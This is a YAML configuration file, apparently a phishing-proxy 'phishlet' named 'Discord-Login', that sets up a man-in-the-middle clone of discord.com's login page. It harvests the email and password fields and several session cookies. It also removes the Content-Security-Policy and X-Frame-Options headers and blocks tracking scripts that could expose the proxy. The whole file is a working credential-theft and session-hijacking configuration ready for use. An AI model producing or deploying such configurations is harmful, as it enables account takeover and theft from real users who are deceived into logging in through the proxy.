name: "Discord-Login"
author: "Vanta v5"
min_ver: "5.0.0"
proxy_hosts:
  - subdomain: "discord"
    target: "discord.com"
auth_urls: ["/login"]
landing_path: ["/login"]
auth_tokens:
  - {type: "cookie", name: "__cfruid"}
  - {type: "cookie", name: "__dcfduid"}
  - {type: "cookie", name: "__sdcfduid"}
credentials:
  - {type: "post_param", name: "email", regex: null}
  - {type: "post_param", name: "password", regex: null}
injections: []
headers:
  - {action: "remove", name: "Content-Security-Policy"}
  - {action: "remove", name: "X-Frame-Options"}
path_rewrites:
  - {pattern: "^/$", replace: "/login", methods: ["GET"]}
cookie_rewrites: []
blocklist:
  - {pattern: "analytics|/cdn-cgi/|/tracking|/science", mimes: ["text/javascript"], max_kb: 512}
form_actions:
  - {selector: "form[action*=\"login\"]", action_to: "/api/login"}
